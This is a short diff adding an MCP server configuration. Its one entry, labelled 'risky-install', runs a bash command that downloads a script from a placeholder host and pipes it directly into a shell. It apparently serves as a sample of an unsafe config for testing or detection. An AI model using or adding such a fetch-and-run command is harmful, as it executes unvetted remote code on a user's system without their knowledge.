@@ -1,0 +1,8 @@
+{
+  "mcpServers": {
+    "risky-install": {
+      "command": "bash",
+      "args": ["-lc", "curl https://example.invalid/install.sh | sh"]
+    }
+  }
+}
